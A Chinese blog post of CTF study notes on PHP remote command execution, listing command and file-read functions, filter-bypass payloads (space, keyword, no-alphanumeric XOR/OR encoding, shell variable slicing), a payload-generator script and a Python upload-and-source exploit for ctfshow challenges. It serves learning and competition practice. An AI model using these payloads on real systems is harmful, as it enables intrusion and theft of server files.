---
layout: post
title: 远程命令执行小结
category: web安全
date: 2023-8-17
---
远古笔记
<!-- more -->
[toc]

# RCE

## 命令执行方式总结

php中可以用来命令执行的函数：

```php
system()
passthru()
exec();
shellexec();
popen();
proc_open();
pcntl_exec();
反引号``，同shell_exec();
// 使用时注意有无回显
```

php中读文件的函数：

```php
show_source();
highlight_file();
file_get_contents(); // 本身不显示，返回值是文件内容
readfile(); // 本身具有打印功能
file(); // 本身不具有打印功能，返回值是文件内容按行排列成为的数组
copy(); // copy("flag.php", "flag.txt")
rename(); // rename("flag.php", "flag.txt")
include(); // 文件不存在时 警告
require(); // 文件不存在时 错误
require_once(); // 同上，但是假如包含过这个文件，不会再次包含
fread(); 
fgets();
fgetc();
fgetss(); // 和fgets()类似，但去掉html和php标记
fgetcsv(); // 每一行都是数组，因此不用echo打印即可
fpassthru();
$a = fopen("flag.php", "r");echo fread($a, 1000);
$a = fopen("flag.php", "r");while(!feof($a)){$line = fgets($a); echo $line;}
$a = fopen("flag.php", "r");while(!feof($a)){$line = fgetc($a); echo $line;}
$a = fopen("flag.php", "r");while(!feof($a)){$line = fgetcsv($a); print_r($line);}
$a = fopen("flag.php", "r");echo fpassthru($a);
```

php中查文件所在位置：

```php
scandir();
print_r(scandir("/var/www/html/"));
print_r(scandir(dirname("__FILE__")));
print_r(scandir(current(localeconv())));
// 不用字符串查指定文件
highlight_file(next(array_reverse(scandir(current(localeconv())))));
// next、current、end分别是第二个元素、第一个元素、最后一个元素
opendir();
$a = opendir("/"); while(($file=readdir($a))!=false){echo $file."\n";}
// 遍历文件
$a = new DirectoryIterator('glob:///*'); // 根目录
$a = new DirectoryIterator('glob:///var/*') // var目录下
foreach($a as $f){echo $f->__toString()." ";}
//或者：
$a = 'glob:///*';
$f = opendir($a);
while(($file=readdir($f))!=false)
{echo $file." ";}
exit(0);
// 使用FilesystemIterator类
echo new FilesystemIterator(getcwd()); // getcwd();返回当前工作目录
```



linux下可以查看文件的命令：

```shell
more
less
tac
cat
tail
nl
od
vi
vim
sort
rev
uniq
file -f
grep
//当然，还有上面所有的编码形式/x
```

常用流协议：

```php
php://filter/read=<1>/resource=<2>
// 此为一个数据过滤器，1处填写使用的过滤器，2中填写读取的文件。
// 例如，php://filter/read=convert.base64-encode/resource=flag.php
// 若直接包含一个php文件，可能会不显示
data://text/plain, <内容>
//文件流，可以直接视为文件用file_get_contents等方式读取
//或者使用以下方式base64一下再读取：
data://text/plain;base64,<内容>
```

日志读取：

```shell
nginx日志:
/var/log/nginx/access.log
apache日志：
/usr/local/apache/logs/access_log
```









下面是想到什么写什么

- exec()函数

没有回显，接受两个参数，即：

exec(\$command, \$array)

第一个参数为命令，第二个参数为执行命令后的回显存放的数组

若直接打印返回值，**只会显示出第一个值**

- shell_exec()函数

没有回显，接受一个参数。即：

shell_exec(\$command)

返回值是回显。

- echo & print_r()

echo没有办法打印出数组的，若打印数组的话，会输出一个Array

## RCE姿势

### 过滤关键字

主要是针对例如flag被过滤又要执行flag.php类似的情况

通配符就不说了

可以用这种方式：`cat fla\g.php`

这种转义绕过的方式是Linux命令转义，php中的字符串没有转义，仍然是fla\g.php

以及`cat fla''g.php`，同上



### 通配符绕过

比如直接过滤flag等等。此处记录一下遇到的payload。

```php
//只过滤flag
?c=system("cat f*")
```

### 空格绕过

可以使用双重GET的方式绕过，当然post也可以。

```php
?c=eval($_GET[1]);&1=system("ls"); //注意这里还有个eval
```

可以使用tab绕过，因为空格可以用tab代替。

```php
?c=print_r(`tac\tf*`);
```

可以用%09代替，本质上是tab符号的url编码

```php
?c=print_r(`tac%09f*`);
```

有时可以尝试%20代替，%20是空格的url编码，但过滤空格可能无法使用

```php
?c=print_r(`tac%20f*`);
```

此外，还可以代替空格的有：

```shell
$IFS$9（使用时要加转义符号）、${IFS}、$IFS%09、<、<> 
// 这些都是在linux shell下可以达到空格的效果
// $IFS在Linux中默认是空格、分隔的字符
```

等等，看情况使用。

无空格方式直接读取文件还有以下方式：

```php
highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));
// next是当前指针的下一个，也就是第二个。
// current是当前指针的这个元素。即数组的第一个元素。
// end最后一个元素
// 这里这样用是因为他是倒数第二个。
```

或

```php
show_source(next(array_reverse(scandir(pos(localeconv())))));
```

本质上是使用php本身的函数来直接读取文件。

### 括号绕过

比如可以使用include()函数。

include()函数的作用是，包含并运行指定文件。

因此可以包含一个文件流即可读取到文件。

include()和require()函数类似，但include()包含的文件不存在时，抛出警告，而require()会产生错误。

include可以不需要空格和任何括号。

payload:

```php
?c=include$_GET[1]?>&1=system("cat flag");
```

### session绕过

在浏览器中修改PHPSESSID的值，然后读取此值，并执行。

以edge浏览器为例，应用程序>Cookie>右键添加一项，写入PHPSESSID的值。

![image-20220815211413950](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202209091333974.png)

直接读取即可, payload:

```php
c=session_start();system(session_id());
```

使用范围：

PHP 5.5-7.1.9之间可以使用。

PHP 5.5以下及PHP7.1以上时，session_id只能是0-9，a-z，A-Z中的字符。

### 无字母数字RCE（php7

用不可见字符，采用异或、或、取反的方式构造出payload。

原理是，**在PHP7中**，可以使用('phpinfo')()这种方式执行函数。

payload示例如下：("system")("cat flag.php")

```
c=("%13%19%60%60%60%0d"|"%60%60%13%14%25%60")("%03%21%60%00%06%0c%21%27%28%60%60%10"|"%60%40%14%20%60%60%40%40%06%10%28%60")
```

贴一个自己写的脚本

```php
<?php

function generate_code($preg, $code, $mode)
{
    if ($mode === 3) {
        $result = "";
        for ($i = 0; $i <= strlen($code); $i++) {
            $t = $code[$i];
            $out = dechex(ord(~$t));
            if(strlen($out) === 1){
                $out = "0".$out;
            }
            $result = $result."%".$out;
        }
        echo "code: (~$result)";
        die();
    }

    $output1 = "";
    $output2 = "";
    for ($ii = 0; $ii < strlen($code); $ii++) {
        $i = $code[$ii]; // 别问这里变量命名怎么这么奇怪 问就是之前不小心写错了懒得改
        $flag = 0;
        for ($j = 0; $j <= 128; $j++) {
            if (preg_match($preg, chr($j))) {
                continue;
            }
            for ($k = 0; $k <= 128; $k++) {
                if (preg_match($preg, chr($k))) {
                    continue;
                }
                $mode === 1 ? $result = $j ^ $k : $result = $j | $k;
                if ($result === ord($i)) {
                    if (strlen(dechex($j)) == 1) {
                        $temp1 = '0' . dechex($j);
                    } else {
                        $temp1 = dechex($j);
                    }
                    if (strlen(dechex($k)) == 1) {
                        $temp2 = '0' . dechex($k);
                    } else {
                        $temp2 = dechex($k);
                    }
                    $output1 = $output1 . "%" . $temp1;
                    $output2 = $output2 . "%" . $temp2;
                    $flag = 1;
                    break;
                }
            }
            if ($flag === 1) {
                break;
            }
        }
    }
    // echo "output1:".$output1."\n"."output2:".$output2."\n";
    if ($mode === 1) {
        echo "code: (\"$output1\"^\"$output2\")";
    } else {
        echo "code: (\"$output1\"|\"$output2\")";
    }
}


$choose = 1; // 1 2 3分别对应异或，或，取反。
$preg = '/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/';  // 替换为要绕过的正则
// $preg = "/[a-z]/";
$code = "get_ctfshow_fl0g";  // 替换为要生成的代码

generate_code($preg, $code, $choose);

```



### 字符串截断

PHP中截断的方式：\00（空字符）截断、\0a（换行符）截断

若是linux命令，可以考虑使用||进行截断。

### 无数字字母RCE（php5

建议再读一下[p神文章]([无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list))

原理：使用Post方式向PHP上传文件的时候，Linux会在/tmp下生成一个九位字符的随机文件。此时使用通配符，/???/?????????有多种匹配结果，但随机文件的最后一个字符有时候可能为大写，因此通配符改为/???/????????[@-[]，即可匹配出这个文件。

匹配出这个文件后，可以直接使用. /???/????????[@-[]执行这个文件。.的用法如下：

```bash
. xxxfile # 等价于 source xxxfile
source xxxfile # 和上面等价，相当于执行这个文件，把这个文件当做shell脚本运行，重要的是不需要文件有x权限
./xxxfile # 相当于开辟一个子shell来执行这个文件，需要x权限
```

此处写一个Python脚本方便回忆。也可以手动构造一个burp的文件上传包。

```python
import requests

url = "http://192.168.81.159:9999/"
files = {'file': ('1.php', 'ls')}
response = requests.post(url + "?c=.+/???/????????[@-[]", files=files)
print(response.text)
```

### 使用$、(、)、~构造数字

在shell中，有以下几个特点：

```shell
$(()) # 结果为0
~$(()) # 结果为~0
# $(()) 包裹的部分中会进行一次计算，例如$((2+2))结果为4，因此：
$((~$(()))) # 结果为-1，因为~0计算结果为-1，要得到-2，可以有构造出$((-1-1))，因此：
$(($((~$(())))$((~$(()))))) # 结果为-2，因此什么-3、-4、乃至-100都可以以此类推了
# 单纯看计算的话，~是取相反数再减1，例如~0=-1，~36=-37。因此36=~-37
```

ctfshow web入门57

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-08 01:02:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

payload：

```shell
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

### 通过数据库读取文件

在Mysql等语言中，是存在方式直接读取文件的，例如Mysql可以使用`load_file()`函数。当然这种读取方式是需要获取数据库信息的。

下面是用PHP建立数据库连接并读取文件的示例：

```php
c = try{
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
    foreach($dbh->query('select load_file("/flag.txt")') as $row){
        echo $row[0]." ";
    }
    $dbh = null;
}catch(PDOException $e){
    echo $e->getMessage();
    exit(0);
}
```



### 通过LInux环境变量构造命令

有以下shell的特性：

```bash
${PWD} # 等效于$PWD，结果为当前路径
${PATH} # 等效于$PATH，结果为环境变量
```

比如：

![image-20220912194929880](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202209121949765.png)

上面的变量是Linux的自带变量，还有很多自带变量，此处不再赘述。一些常见的如下：

```bash
${SHLVL} # 意思是shell的深度，直接调用为1，假如在bash中进入bash，则值为2.可用来构造1这个数。
${BASH} # 输出bash完整路径名。通常为/bin/bash或/usr/local/bin/bash
${BASH_VERSION} # 输出BASH版本。至少第一位是数字，可能3,4,5,6？
${HOME} # root用户在/root，一般用户在/home/账号
${RANDOM} # 随机数，可能为4位或5位数？
${USER} # 用户名，师傅们说一般权限给的都是www-data
${IFS} # 这个是分隔符，但是最重要的是下一条性质
${#IFS} # 为3
${#?} # 为1
$? # 上一条指令执行成功 结果为0 执行失败 结果为1.注意，command not find测试结果为127.有师傅这里先故意使用<A命令，<这里的意思是输出到A（我猜应该是？），然后即执行错误，因为文件A不存在。
```

另外，在师傅们的WP中看到可以利用PHP语言的环境变量。不过，我在本地ubuntu环境未能成功复现。假如需要用到，可以试一试。

```bash
${PHP_VERSION} # PHP的版本号。由于抓包可以看到版本号，因此是个已知变量。
```

此外，在shell中，可以加上#获取字符串长度。例如：

```bash
${#} # 结果为0
${#RANDOM} # 结果为4或5 
```

可以用`:`来进行切片操作。`~`来进行倒序切片。

```bash
# 假设${BASH}为/usr/bin/bash
${BASH:0:2} # 表示从0开始，取长度为2的字符串，即/u
${BASH:~0:1} # 表示从最后一个字符开始，向右取1个字符。注~0=-1. 结果为h
${BASH:~0:2} # 表示从倒数第二个字符开始，向右取2个字符。 结果为sh
# 又：$((A)) 为0，$((B))为0
# 不难得出$((~A))为-1
# 因此
${BASH:~A:1} # 仍然表示从最后一个字符开始。因为~A=-1.
```

ctfshow web118中，即可利用这一特性构造nl flag.php。

该题只可用大写字母、`${}?:~.`等符号，且命令执行处为`system($code)`形式。

构造payload可以为：

```bash
${PATH:~A}${PWD:~A}${IFS}????.??? # nl flag.php
```

ctfshow web119中，`${PATH}`不可用，师傅们一共有以下trick：

```bash
# 构造/bin/base64 ，即/???/?????4.但实际上，我本地满足此通配符的命令有很多。
# 这里PWD是/var/www/html，取第一位的斜杠。RANDOM为五位数一下，多试几次有四位数。
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?????${#RANDOM}${IFS}????.???
# 构造/bin/cat ，这里有师傅说可以/???/?a?，我本地这个通配符也是比较多。记录一下吧。
# 也有师傅构造的/???/?at，t是从$USER的www-data来的，这个USER很难说。
# PHP_VERSION是7.3.22，最后一位是2。 PWD是/var/www/html，第二位是a。
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${PWD:${PHP_VERSION:~A}:${#SHLVL}}?${IFS}????.??? # 这题确实能打出来 只是有一堆乱码罢了。
```

ctfshow web122中，可以用`<、$HOME `，其他的环境变量，包括`#`都不能用。出题人师傅给了个巧妙的解法：

```bash
<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
# <A，执行失败使得$?值为1.这样构造出来1之后可以得到斜杠/，并通过取RANDOM的第一位，获取任意数。这里构造了/bin/base64
```

